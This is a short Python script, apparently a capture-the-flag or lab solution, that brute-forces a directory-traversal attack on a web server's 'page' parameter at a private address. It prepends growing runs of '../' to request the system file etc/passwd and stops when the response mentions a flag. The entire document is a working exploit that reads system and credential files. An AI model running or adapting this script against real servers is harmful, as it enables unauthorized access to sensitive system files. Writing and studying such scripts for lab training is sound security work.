import requests
from bs4 import BeautifulSoup

host = "192.168.55.3"
url = f"http://{host}/?page="
passwd = "etc/passwd"

for i in range(1, 100):
	r = requests.get(url + f"{i * '../'}" + passwd)
	if "flag" in r.text:
		soup = BeautifulSoup(r.text, 'html.parser')
		print(soup.find('script'))
		break